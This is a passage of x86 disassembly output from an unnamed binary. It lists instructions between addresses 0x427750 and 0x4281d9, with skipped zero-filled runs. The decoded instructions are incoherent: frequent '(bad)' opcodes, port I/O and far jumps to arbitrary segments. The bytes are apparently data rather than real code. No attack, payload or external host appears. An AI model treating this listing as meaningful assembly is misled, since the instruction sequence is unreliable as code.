  427750:	clc    
  427751:	pop    esi
  427752:	jp     0x42779b
  427754:	ins    DWORD PTR es:[edi],dx
  427755:	mov    bh,0x71
  427757:	push   0x3b
  427759:	jmp    0xa268:0xf75c6041
  427760:	inc    esp
  427761:	mov    BYTE PTR [edx+0x0],bl
  427764:	mov    BYTE PTR [esi],0xca
  427767:	add    esi,DWORD PTR [ebx-0x3a67b9cf]
  42776d:	xchg   esp,eax
  42776e:	popf   
  42776f:	inc    ebp
  427770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427771:	mov    ebp,0xcda4db81
  427776:	and    DWORD PTR [edi],0xffffffc5
  427779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42777a:	xchg   edx,eax
  42777b:	loopne 0x42775b
  42777d:	aaa    
  42777e:	adc    ecx,edx
  427780:	cs bnd ret 
  427783:	mov    cl,0x92
  427785:	int3   
  427786:	pop    ecx
  427787:	push   ss
  427788:	(bad)  
  427789:	xchg   esi,eax
  42778a:	pusha  
  42778b:	xchg   edi,eax
  42778c:	nop
  42778d:	xchg   edi,eax
  42778e:	xor    al,0x78
  427790:	jnp    0x4277e0
  427792:	nop
  427793:	xor    BYTE PTR [ebx],bl
  427795:	mov    ebp,0x4dc4c8b7
  42779a:	in     al,0xa3
  42779c:	imul   ebx,ecx,0x40fe7058
  4277a2:	(bad)  
  4277a3:	addr16 leave 
  4277a5:	cmp    esi,DWORD PTR [ebx-0x4]
  4277a8:	sbb    al,dh
  4277aa:	and    DWORD PTR [ebp-0x40],0x12adfb60
  4277b1:	retf   
  4277b2:	lock out 0xc7,al
  4277b5:	sbb    DWORD PTR es:[esi-0x6c],edi
  4277b9:	xchg   esp,esp
  4277bb:	shl    BYTE PTR [edx-0x37ba50c0],0xa0
  4277c2:	mov    ebp,0xe3e102dd
  4277c7:	add    al,0xc9
  4277c9:	jne    0x427815
  4277cb:	sar    al,1
  4277cd:	test   ah,ch
  4277cf:	lods   eax,DWORD PTR ds:[esi]
  4277d0:	mov    dh,0x3a
  4277d2:	or     DWORD PTR [ebx-0x71772821],0x35ee4a7f
  4277dc:	sub    eax,0x4daaade5
  4277e1:	push   edi
  4277e2:	sbb    dh,ch
  4277e4:	jmp    0x4eb3:0x9f96dde8
  4277eb:	sub    BYTE PTR [ebp-0x7a],cl
  4277ee:	xchg   esp,eax
  4277ef:	(bad)  
  4277f0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277f2:	ss and ebp,ebp
  4277f5:	dec    edx
  4277f6:	fs enter 0x4cdf,0x13
  4277fb:	inc    eax
  4277fc:	pop    edi
  4277fd:	pushf  
  4277fe:	sar    DWORD PTR [edx-0x479ac463],0x4d
  427805:	nop
  427806:	ret    0xd9ac
  427809:	ins    DWORD PTR es:[edi],dx
  42780a:	ins    DWORD PTR es:[edi],dx
  42780b:	fwait
  42780c:	jb     0x427865
  42780e:	jmp    0x4277b3
  427810:	fadd   DWORD PTR [eax]
	...
  427872:	add    BYTE PTR [eax],al
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	in     al,dx
  427881:	mov    esp,0xa6f1758d
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0x3f000001
  42788d:	pop    esp
  42788e:	sub    cl,BYTE PTR ds:0x787f5ebe
  427894:	dec    esi
  427895:	aas    
  427896:	xchg   esp,eax
  427897:	fnclex 
  427899:	xor    eax,0xf7f999ee
  42789e:	ret    0x31b5
  4278a1:	jno    0x4278fb
  4278a3:	test   eax,0x4ef8a2b8
  4278a8:	pop    es
  4278a9:	and    DWORD PTR [ebp-0x64d7132d],0xc7cb5539
  4278b3:	rcr    BYTE PTR [ebx+0x69d4535e],1
  4278b9:	jle    0x427906
  4278bb:	(bad)  
  4278bc:	mov    ecx,0xbad2ea85
  4278c1:	das    
  4278c2:	cmp    DWORD PTR [ebx-0x4b4e4587],ecx
  4278c8:	sar    BYTE PTR ds:0x24fb6b4,cl
  4278ce:	ja     0x427921
  4278d0:	fmulp  st(3),st
  4278d2:	(bad)  
  4278d4:	pop    edi
  4278d5:	add    ch,BYTE PTR [eax]
  4278d7:	mov    bh,0x2a
  4278d9:	jae    0x42790e
  4278db:	mov    esp,0x84e272df
  4278e0:	scas   eax,DWORD PTR es:[edi]
  4278e1:	sub    al,BYTE PTR [edx+0x37]
  4278e4:	test   BYTE PTR [edi+0x796fa7e4],0xc2
  4278eb:	xchg   edi,eax
  4278ec:	(bad)  
  4278ed:	ins    BYTE PTR es:[edi],dx
  4278ee:	cmp    al,0xb5
  4278f0:	add    esi,DWORD PTR [edi-0x76d00956]
  4278f6:	push   cs
  4278f7:	pop    ebp
  4278f8:	xor    esi,DWORD PTR [edi-0x7824825d]
  4278fe:	jnp    0x427975
  427900:	inc    ecx
  427901:	out    0xf1,al
  427903:	pop    ebp
  427904:	retf   
  427905:	xchg   esi,eax
  427906:	out    0xbf,al
  427908:	xchg   edx,eax
  427909:	sbb    DWORD PTR [edx],esp
  42790b:	jge    0x427897
  42790d:	cld    
  42790e:	pushf  
  42790f:	ja     0x427960
  427911:	in     al,0x2a
  427913:	cmc    
  427914:	jbe    0x42797b
  427916:	inc    edi
  427917:	hlt    
  427918:	mov    ebx,edx
  42791a:	xchg   DWORD PTR [edi-0xcc08309],edi
  427920:	push   edx
  427921:	pop    edi
  427922:	mov    ?,WORD PTR [ebp-0x7b]
  427925:	jle    0x42795e
  427927:	adc    bl,BYTE PTR [ebp+0x37d97099]
  42792d:	aad    0x63
  42792f:	dec    eax
  427930:	xchg   edx,eax
  427931:	leave  
  427932:	outs   dx,DWORD PTR ds:[esi]
  427933:	das    
  427934:	push   edx
  427935:	sbb    BYTE PTR [edi],bl
  427937:	outs   dx,BYTE PTR ds:[esi]
  427938:	jp     0x42796e
  42793a:	popa   
  42793b:	xchg   DWORD PTR [ebx+esi*4],esi
  42793e:	das    
  42793f:	loopne 0x427922
  427941:	xor    al,0xf5
  427943:	aam    0xd5
  427945:	jge    0x427900
  427947:	rcr    dl,cl
  427949:	xlat   BYTE PTR ds:[ebx]
  42794a:	jne    0x427959
  42794c:	dec    eax
  42794d:	test   eax,0xb2c1dab0
  427952:	dec    edx
  427953:	pop    ebp
  427954:	push   es
  427955:	sti    
  427956:	add    eax,0xd77758e5
  42795b:	outs   dx,DWORD PTR ds:[esi]
  42795c:	mov    cl,BYTE PTR [ebx]
  42795e:	shr    cl,cl
  427960:	in     eax,dx
  427961:	and    eax,0xf3bf6414
  427966:	mov    WORD PTR [ecx-0x3f5912ee],ds
  42796c:	xchg   edx,eax
  42796d:	mov    esi,0xb15871f9
  427972:	fadd   DWORD PTR [ebx-0x6824c740]
  427978:	sbb    eax,DWORD PTR [edi+0x28]
  42797b:	xor    ch,BYTE PTR [ebp+edx*8-0x3a474c31]
  427982:	and    DWORD PTR [edx+0x5991d5dc],0xc058d8a9
  42798c:	repnz addr16 popa 
  42798f:	cmp    ah,BYTE PTR [eax+0x0]
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx+0x615e3fff]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	das    
  427a0d:	push   edx
  427a0e:	pop    es
  427a0f:	cmp    DWORD PTR [eax],ecx
  427a11:	sbb    eax,DWORD PTR [ebx]
  427a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a14:	xchg   ebp,eax
  427a15:	(bad)  
  427a16:	imul   esp,DWORD PTR [esp+eiz*8],0x143e2f57
  427a1d:	sbb    al,0xda
  427a1f:	mov    BYTE PTR ds:0xf99e5ef7,ch
  427a25:	addr16 mov dh,0x95
  427a28:	shl    BYTE PTR [edi-0x4],1
  427a2b:	sar    BYTE PTR [edx],0xf4
  427a2e:	xlat   BYTE PTR ds:[ebx]
  427a2f:	push   cs
  427a30:	sbb    eax,0xc38ebe43
  427a35:	test   al,0xb0
  427a37:	retf   0x7056
  427a3a:	icebp  
  427a3b:	or     DWORD PTR [ebp-0x11],esp
  427a3e:	call   DWORD PTR [esi]
  427a40:	push   eax
  427a41:	sbb    eax,0x85222b33
  427a46:	shl    eax,1
  427a48:	adc    eax,0xfdb157f4
  427a4d:	add    ch,dl
  427a4f:	cli    
  427a50:	push   edi
  427a51:	or     dl,BYTE PTR [esi+0x73]
  427a54:	ja     0x427a10
  427a56:	jne    0x427a0c
  427a58:	and    edi,DWORD PTR [edi+0x2f]
  427a5b:	xor    edx,0xf813bc7
  427a61:	not    BYTE PTR [edx-0x4a699e09]
  427a67:	xor    eax,0xabc7b662
  427a6c:	sahf   
  427a6d:	retf   
  427a6e:	push   ebp
  427a6f:	and    edx,0x46
  427a72:	(bad)
  427a76:	lods   al,BYTE PTR ds:[esi]
  427a77:	cmc    
  427a78:	repz test dh,0x62
  427a7c:	(bad)  
  427a7d:	mov    dh,0xdc
  427a7f:	fisub  DWORD PTR [ecx]
  427a81:	gs jl  0x427ab8
  427a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a85:	xchg   ebp,eax
  427a86:	js     0x427a38
  427a88:	inc    edx
  427a89:	push   edi
  427a8a:	outs   dx,DWORD PTR ds:[esi]
  427a8b:	push   esi
  427a8c:	ss pop edi
  427a8e:	adc    edi,DWORD PTR [ebx-0x87809d9]
  427a94:	push   edi
  427a95:	sub    bh,ch
  427a97:	retf   
  427a98:	inc    BYTE PTR [edx+0x55]
  427a9b:	inc    esi
  427a9c:	sar    dl,0xe4
  427a9f:	test   eax,0x2a45d35d
  427aa4:	push   cs
  427aa5:	sahf   
  427aa6:	mov    esp,ebp
  427aa8:	add    al,0x63
  427aaa:	xchg   ecx,eax
  427aab:	fnstsw WORD PTR [ebp-0x24]
  427aae:	test   BYTE PTR [edx+0xf02cf52],dh
  427ab4:	inc    esp
  427ab5:	xchg   ecx,eax
  427ab6:	mov    ebx,0x88e4e2d6
  427abb:	mov    ecx,0x1de47884
  427ac0:	shl    BYTE PTR [edx],cl
  427ac2:	repnz test BYTE PTR [ecx-0x4fc811bf],ch
  427ac9:	mov    DWORD PTR [edi],0x6f8512e8
  427acf:	push   esi
  427ad0:	clc    
  427ad1:	shl    bh,cl
  427ad3:	inc    eax
  427ad4:	and    esp,DWORD PTR [edx-0x1257288d]
  427ada:	imul   edx,DWORD PTR [ebp+0x2180d055],0x95da17c4
  427ae4:	sbb    esi,DWORD PTR [edi-0x5]
  427ae7:	xchg   edi,eax
  427ae8:	push   cs
  427ae9:	sub    al,0x5b
  427aeb:	cmp    al,BYTE PTR [esi-0x41]
  427aee:	xchg   esp,eax
  427aef:	cmp    edx,esp
  427af1:	and    bl,BYTE PTR [eax-0x6f6c9a76]
  427af7:	jecxz  0x427b37
  427af9:	in     al,0xfa
  427afb:	push   es
  427afc:	inc    edi
  427afd:	push   ecx
  427afe:	mov    DWORD PTR [ebp-0x6cf35bb3],ecx
  427b04:	mov    esp,0x1cccbdef
  427b09:	sub    al,BYTE PTR [ecx]
  427b0b:	mul    DWORD PTR [edi-0x20ee6fbb]
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   BYTE PTR [ecx-0x45994bb],0xa8
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0x8000001
  427b8d:	shl    DWORD PTR [ecx-0x1957fe79],0x60
  427b94:	pop    esp
  427b95:	aas    
  427b96:	lods   eax,DWORD PTR ds:[esi]
  427b97:	push   ss
  427b98:	sti    
  427b99:	int3   
  427b9a:	sub    BYTE PTR [edx],bl
  427b9c:	arpl   WORD PTR [eax+0x4f],sp
  427b9f:	sti    
  427ba0:	jno    0x427b22
  427ba2:	or     BYTE PTR [eax-0x5d],bl
  427ba5:	repnz xchg ebx,eax
  427ba7:	into   
  427ba8:	ret    
  427ba9:	mov    ah,0xb7
  427bab:	mov    ah,0xba
  427bad:	ins    BYTE PTR es:[edi],dx
  427bae:	mov    edx,0xb23d51fa
  427bb3:	iret   
  427bb4:	jp     0x427b5e
  427bb6:	shl    DWORD PTR [esi],1
  427bb8:	jmp    0x2afc:0xd65ed1c5
  427bbf:	inc    ebx
  427bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bc1:	icebp  
  427bc2:	sub    edx,DWORD PTR [edx-0x6e548d54]
  427bc8:	test   BYTE PTR [eax],ah
  427bca:	cdq    
  427bcb:	and    bh,BYTE PTR [edx]
  427bcd:	dec    eax
  427bce:	out    0x19,eax
  427bd0:	sub    esp,eax
  427bd2:	call   0x3f3c1b54
  427bd7:	push   ecx
  427bd8:	mov    edx,0x697a8fad
  427bdd:	inc    DWORD PTR [ebp+0x322892b5]
  427be3:	mov    esi,0xf3d5955
  427be8:	pop    ebx
  427be9:	pop    ss
  427bea:	mov    esp,0x8f1e50f1
  427bef:	push   es
  427bf0:	inc    ecx
  427bf1:	pop    ecx
  427bf2:	mov    ah,0xa
  427bf4:	imul   edi,DWORD PTR [ebp-0x78f10157],0xb0715f80
  427bfe:	cmp    DWORD PTR [ebx-0x1948ab27],esi
  427c04:	push   eax
  427c05:	pop    ebp
  427c06:	add    al,0x2
  427c08:	add    eax,0x4903c1e2
  427c0d:	push   edx
  427c0e:	sub    BYTE PTR [ebp-0x29],al
  427c11:	sub    BYTE PTR [ebp-0x39],ah
  427c14:	jmp    0x3b4a7ae7
  427c19:	ret    0x2f7f
  427c1c:	iret   
  427c1d:	mov    ebx,esp
  427c1f:	sbb    al,0x5a
  427c21:	or     esp,DWORD PTR [ebx]
  427c23:	mov    eax,ds:0x8e6a3e90
  427c28:	mov    edi,0x2bd97c83
  427c2d:	dec    ebx
  427c2e:	aam    0xa2
  427c30:	cmp    dl,dh
  427c32:	fadd   QWORD PTR [edx]
  427c34:	jne    0x427cae
  427c36:	stc    
  427c37:	call   0xbaaa158
  427c3c:	jno    0x427cb7
  427c3e:	ret    
  427c3f:	mov    ds:0x1075326,eax
  427c44:	(bad)  
  427c45:	sub    ebp,DWORD PTR [edi+ecx*1+0x4d6f1008]
  427c4c:	fistp  WORD PTR [ecx-0x19]
  427c4f:	outs   dx,DWORD PTR ds:[esi]
  427c50:	and    DWORD PTR [esi],0xffffffa8
  427c53:	cmp    cl,BYTE PTR [esi]
  427c55:	xor    eax,0x759cdcd9
  427c5a:	jb     0x427c9e
  427c5c:	out    dx,al
  427c5d:	mov    ch,0x21
  427c5f:	fidivr WORD PTR [esi]
  427c61:	add    al,0xd4
  427c63:	mov    ?,WORD PTR [edi-0x3105ee16]
  427c69:	loope  0x427cad
  427c6b:	fadd   st(1),st
  427c6d:	stos   DWORD PTR es:[edi],eax
  427c6e:	shl    eax,1
  427c70:	rcl    BYTE PTR [ebp+0x16],1
  427c73:	(bad)  
  427c74:	dec    esi
  427c75:	je     0x427c69
  427c77:	int3   
  427c78:	mov    esp,0x55894f86
  427c7d:	div    BYTE PTR [ebp+0x2997f1a5]
  427c83:	aad    0x15
  427c85:	dec    edi
  427c86:	mov    edx,0x52f251d5
  427c8b:	ficomp WORD PTR [esi]
  427c8d:	xlat   BYTE PTR ds:[ebx]
  427c8e:	dec    ebp
  427c8f:	cmp    DWORD PTR [edx+0x0],esp
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x3a6c5d44,ebx
  427d02:	(bad)  
  427d03:	lock add BYTE PTR [edx+0x1050001],ch
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	sub    ax,WORD PTR [ebx+0x74]
  427d10:	add    ebx,ebx
  427d12:	pusha  
  427d13:	pop    esp
  427d14:	jl     0x427d5e
  427d16:	imul   eax,DWORD PTR [edi+0x31c27861],0xffffff84
  427d1d:	mov    al,gs:0xda5a7744
  427d23:	stos   DWORD PTR es:[edi],eax
  427d24:	fs dec esi
  427d26:	cli    
  427d27:	lods   eax,DWORD PTR ds:[esi]
  427d28:	jp     0x427d85
  427d2a:	out    0x65,al
  427d2c:	in     eax,0x89
  427d2e:	sar    ah,cl
  427d30:	ret    
  427d31:	sar    BYTE PTR [eax],0x1d
  427d34:	call   0xa69692ff
  427d39:	fstp   TBYTE PTR [eax+0x78bb690e]
  427d3f:	test   al,0x5e
  427d41:	fbstp  TBYTE PTR [edi]
  427d43:	jg     0x427d98
  427d45:	add    eax,0xcbdd8d
  427d4a:	push   edi
  427d4b:	inc    edx
  427d4c:	ret    
  427d4d:	cmp    DWORD PTR [esi+0x5a],ebx
  427d50:	jns    0x427d1d
  427d52:	aas    
  427d53:	inc    ecx
  427d54:	leave  
  427d55:	add    DWORD PTR [esi-0x17],0xffffffe7
  427d59:	iret   
  427d5a:	xor    esp,ebp
  427d5c:	mov    bh,0xb1
  427d5e:	inc    ebp
  427d5f:	push   ss
  427d60:	pop    ss
  427d61:	jae    0x427d8e
  427d63:	jp     0x427d58
  427d65:	xchg   ebx,eax
  427d66:	inc    ebx
  427d67:	jns    0x427cfa
  427d69:	shl    DWORD PTR [edx-0x68582957],0xcc
  427d70:	rol    BYTE PTR [edi+0x43c035ba],1
  427d76:	adc    ebx,ecx
  427d78:	xchg   edi,eax
  427d79:	mov    ch,BYTE PTR [ecx+0x10]
  427d7c:	or     al,0x34
  427d7e:	das    
  427d7f:	fs jp  0x427de4
  427d82:	mov    edx,0xa9bfd26f
  427d87:	les    esp,FWORD PTR [ebp+0x5f5afeb]
  427d8d:	or     bl,BYTE PTR [eax]
  427d8f:	scas   al,BYTE PTR es:[edi]
  427d90:	ins    DWORD PTR es:[edi],dx
  427d91:	(bad)  ds:0xfa993e5f
  427d97:	repz adc eax,ebp
  427d9a:	and    al,0x48
  427d9c:	xor    eax,0xdc386f6a
  427da1:	dec    esi
  427da2:	mov    dl,0xb7
  427da4:	sub    edx,edx
  427da6:	xor    dl,BYTE PTR [edx-0x7775a6d6]
  427dac:	inc    eax
  427dad:	in     al,0x1a
  427daf:	cld    
  427db0:	imul   edx,DWORD PTR [edx-0x2593632e],0xffffff8f
  427db7:	es push cs
  427db9:	imul   ebp,DWORD PTR ds:0x3e8c508d,0x41
  427dc0:	dec    edi
  427dc1:	call   0x33dc:0x8ea96a5c
  427dc8:	repz push esp
  427dca:	push   cs
  427dcb:	push   0x52
  427dcd:	sbb    bl,cl
  427dcf:	outs   dx,DWORD PTR ds:[esi]
  427dd0:	jmp    0xaf9fa0ab
  427dd5:	fwait
  427dd6:	inc    ecx
  427dd7:	mov    ds:0x791037bf,eax
  427ddc:	push   ebx
  427ddd:	in     al,dx
  427dde:	fwait
  427ddf:	aam    0xfc
  427de1:	cli    
  427de2:	ret    
  427de3:	push   ecx
  427de4:	fadd   st,st(3)
  427de6:	add    edi,DWORD PTR [eax-0x81212c0]
  427dec:	shr    BYTE PTR [esp+eax*1-0x24be1e65],cl
  427df3:	ins    DWORD PTR es:[edi],dx
  427df4:	lea    ecx,[esi+0x4]
  427df7:	es jg  0x427d9c
  427dfa:	push   esp
  427dfb:	pop    eax
  427dfc:	call   FWORD PTR [edi+0x65]
  427dff:	and    eax,0x8bcb0274
  427e04:	xchg   BYTE PTR [edi+0x6f],ah
  427e07:	arpl   WORD PTR [ecx-0x1b5f06aa],ax
  427e0d:	pop    esp
  427e0e:	jmp    0x0:0xe326
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	fdivrp st(0),st
  427e82:	fistp  QWORD PTR [edi+0x1ab05]
  427e88:	add    eax,0x70000001
  427e8d:	idiv   DWORD PTR ds:0x14e33de7
  427e93:	jno    0x427e45
  427e95:	mov    ah,BYTE PTR [edx]
  427e97:	rcr    DWORD PTR [edx],cl
  427e99:	jb     0x427e32
  427e9b:	pushf  
  427e9c:	ins    DWORD PTR es:[edi],dx
  427e9d:	loop   0x427eab
  427e9f:	push   ebp
  427ea0:	(bad)  
  427ea2:	ror    BYTE PTR [esi-0x381d52c2],0xea
  427ea9:	pop    esi
  427eaa:	sti    
  427eab:	nop
  427eac:	ss xchg esi,eax
  427eae:	jg     0xe8f25de7
  427eb4:	add    DWORD PTR [edx],esp
  427eb6:	test   eax,0x876b4d56
  427ebb:	cmp    al,0x4a
  427ebd:	add    ecx,0xb0b0efd8
  427ec3:	xor    dh,BYTE PTR [eax+0x10]
  427ec6:	mov    ecx,DWORD PTR [ebp-0x50]
  427ec9:	cmp    dl,BYTE PTR [ecx]
  427ecb:	call   0x991:0xcf61aaed
  427ed2:	aaa    
  427ed3:	push   cs
  427ed4:	xchg   DWORD PTR [ebx],ebx
  427ed6:	xor    esi,DWORD PTR [eax]
  427ed8:	gs mov esi,0x5446360d
  427ede:	es mov edx,0x64645c82
  427ee4:	hlt    
  427ee5:	xor    si,WORD PTR ds:0x306117c9
  427eec:	add    al,0xd
  427eee:	sbb    eax,0xab1433a
  427ef3:	dec    edi
  427ef4:	add    eax,0xe01a66bc
  427ef9:	xor    dl,al
  427efb:	dec    ecx
  427efc:	in     al,0x35
  427efe:	rol    BYTE PTR [ebx],cl
  427f00:	ss dec ebx
  427f02:	mov    bh,0xf3
  427f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f05:	int    0x78
  427f07:	add    esi,DWORD PTR [edx-0x4356b933]
  427f0d:	sbb    BYTE PTR [ecx-0x64],bl
  427f10:	push   edx
  427f11:	aaa    
  427f12:	or     BYTE PTR [ebx+0x9],0xaf
  427f16:	xchg   edi,eax
  427f17:	retf   0xc8c3
  427f1a:	xor    eax,DWORD PTR [ebx]
  427f1c:	cdq    
  427f1d:	aas    
  427f1e:	adc    eax,0x218ac5e9
  427f23:	jmp    0xa04248f4
  427f28:	in     al,0xef
  427f2a:	dec    ebp
  427f2b:	ds aas 
  427f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f2e:	pop    ebp
  427f2f:	xor    eax,0x394994a7
  427f34:	mov    ds,edx
  427f36:	sbb    dh,BYTE PTR ds:0x325a9108
  427f3c:	xchg   ch,bh
  427f3e:	push   edx
  427f3f:	retf   0xb70d
  427f42:	cmp    ebx,edx
  427f44:	test   BYTE PTR ds:0x158c0998,bh
  427f4a:	mov    ah,0x99
  427f4c:	mov    bl,0x2b
  427f4e:	mov    cl,0x2b
  427f50:	jns    0x427fca
  427f52:	mov    ds:0x9bf00e98,al
  427f57:	inc    ebx
  427f58:	add    DWORD PTR [ecx+esi*4],0xffffffe2
  427f5c:	fimul  DWORD PTR [esi-0x4efb9801]
  427f62:	push   edx
  427f63:	outs   dx,BYTE PTR ds:[esi]
  427f64:	cdq    
  427f65:	out    dx,eax
  427f66:	ret    0xc0db
  427f69:	loopne 0x427fcf
  427f6b:	rcr    bl,1
  427f6d:	scas   eax,DWORD PTR es:[edi]
  427f6e:	int    0x12
  427f70:	(bad)  
  427f71:	jmp    0x22cd:0x68f18e50
  427f78:	xchg   ecx,eax
  427f79:	sbb    dh,bh
  427f7b:	mov    edx,ebp
  427f7d:	lock (bad) 
  427f7f:	mov    ch,0x9b
  427f81:	mov    ebx,0x81560c1d
  427f86:	test   eax,0xc9cbeb6d
  427f8b:	aas    
  427f8c:	mov    BYTE PTR [esi],al
  427f8e:	sbb    cl,cl
  427f90:	jle    0x427f92
	...
  427ff2:	add    BYTE PTR [eax],al
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	push   es
  428001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428002:	daa    
  428003:	mov    WORD PTR [edx],cs
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0xb9000001
  42800d:	enter  0x2cdc,0x48
  428011:	xlat   BYTE PTR ds:[ebx]
  428012:	daa    
  428013:	mov    ch,0x9e
  428015:	fucomp st(5)
  428017:	std    
  428018:	push   ecx
  428019:	mov    dh,0xdc
  42801b:	sbb    ch,BYTE PTR [edi-0x22]
  42801e:	sbb    dl,BYTE PTR [ebx]
  428020:	das    
  428021:	sub    dh,dh
  428023:	cld    
  428024:	fwait
  428025:	push   edx
  428026:	pop    eax
  428027:	nop
  428028:	sbb    eax,0xc9952fe
  42802d:	aaa    
  42802e:	(bad)  ds:0x1f9bf156
  428034:	mov    ah,0xcc
  428036:	or     DWORD PTR [ebx-0x2b93dbad],edx
  42803c:	repz xchg esi,eax
  42803e:	rcr    DWORD PTR [edi],1
  428040:	or     BYTE PTR [ebp-0x3c],bl
  428043:	sbb    dh,BYTE PTR [edx-0x25]
  428046:	enter  0x4aed,0xdf
  42804a:	adc    BYTE PTR [ecx+0x62],0xce
  42804e:	push   0x8575978
  428053:	imul   edx,edx,0x69971c80
  428059:	daa    
  42805a:	in     al,0x3e
  42805c:	into   
  42805d:	push   ss
  42805e:	mov    esi,0x66f6f407
  428063:	lds    ebp,FWORD PTR [edx-0x4dc3e449]
  428069:	or     DWORD PTR [edx-0x22c48d5f],ebx
  42806f:	jb     0xc3b63631
  428075:	mov    eax,ds:0x40a28a76
  42807a:	push   es
  42807b:	adc    esp,ebp
  42807d:	dec    ebx
  42807e:	clc    
  42807f:	mov    esi,0xad294b19
  428084:	or     BYTE PTR [ecx-0x3a],ah
  428087:	mul    DWORD PTR [ebp+0x3723775f]
  42808d:	pop    esp
  42808e:	fstp   TBYTE PTR [ebx-0xf]
  428091:	mov    WORD PTR [esi],fs
  428093:	inc    eax
  428094:	inc    eax
  428095:	jne    0x428070
  428097:	scas   eax,DWORD PTR es:[edi]
  428098:	pop    ebx
  428099:	sahf   
  42809a:	cmp    eax,0x6f78990
  42809f:	ja     0x4280e6
  4280a1:	push   es
  4280a2:	dec    ebp
  4280a3:	pop    eax
  4280a4:	pxor   mm5,QWORD PTR ds:0x8e971975
  4280ab:	mov    bl,0x9f
  4280ad:	pop    es
  4280ae:	sub    esi,DWORD PTR [eax+0x6cc42899]
  4280b4:	mov    cl,BYTE PTR [edx+0x5b]
  4280b7:	cmp    al,0x3b
  4280b9:	cwde   
  4280ba:	inc    ecx
  4280bb:	xchg   ecx,eax
  4280bc:	sahf   
  4280bd:	shr    BYTE PTR [ebp-0x6a],1
  4280c0:	mov    ds:0xbe2f899c,al
  4280c5:	ds out 0xa8,al
  4280c8:	lods   al,BYTE PTR ds:[esi]
  4280c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280ca:	cdq    
  4280cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280cc:	iret   
  4280cd:	pop    ss
  4280ce:	sub    dl,bl
  4280d0:	ret    0x93e7
  4280d3:	sti    
  4280d4:	mov    WORD PTR [ebp+0x4c],ds
  4280d7:	arpl   ax,cx
  4280d9:	jmp    0x1c033c97
  4280de:	sbb    al,0x1c
  4280e0:	(bad)  
  4280e1:	mov    ebp,0x6a4a067b
  4280e6:	sbb    esi,DWORD PTR [edx+0x5a]
  4280e9:	aaa    
  4280ea:	cs cli 
  4280ec:	outs   dx,BYTE PTR ds:[esi]
  4280ed:	pushf  
  4280ee:	mov    esi,0x8a45b5ef
  4280f3:	jnp    0x428173
  4280f5:	sub    cl,BYTE PTR [esi]
  4280f7:	mov    edi,0x76c7173c
  4280fc:	test   DWORD PTR [ebx],edi
  4280fe:	add    DWORD PTR [ebx],0xffffff91
  428101:	mov    ah,0xaa
  428103:	jg     0x4280d4
  428105:	jne    0x4280b2
  428107:	shl    eax,cl
  428109:	sub    edi,DWORD PTR [ecx]
  42810b:	adc    eax,0x502875bb
  428110:	jbe    0x428112
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	mov    ah,0xd1
  428182:	enter  0xfd6,0xad
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0x2d000001
  42818d:	and    edi,DWORD PTR ds:0x1bf83ab3
  428193:	hlt    
  428194:	sbb    DWORD PTR [edi+0x6ec7133c],ebx
  42819a:	mov    WORD PTR [ecx],ss
  42819c:	retf   
  42819d:	mov    eax,0xc02812d2
  4281a2:	sbb    eax,0x54d1c996
  4281a7:	pop    eax
  4281a8:	add    BYTE PTR [esi+0x211e3e9],dh
  4281ae:	das    
  4281af:	sub    BYTE PTR [esi+ecx*4+0x31],dh
  4281b3:	imul   ebp,ecx,0xffffffaf
  4281b6:	sbb    BYTE PTR [ecx-0x37],ch
  4281b9:	mov    dl,0xc4
  4281bb:	cmpxchg BYTE PTR [esi-0x6e6aed45],bl
  4281c2:	pop    es
  4281c3:	in     al,0xba
  4281c5:	push   ebx
  4281c6:	or     cl,BYTE PTR [esp+ecx*1-0x13]
  4281ca:	add    bh,0xe5
  4281cd:	inc    esi
  4281ce:	jne    0x4281db
  4281d0:	data16 adc BYTE PTR [edi-0x52],ah
  4281d4:	inc    esi
  4281d6:	data16 fsubrp st(6),st
  4281d9:	scas   eax,DWORD PTR es:[edi]
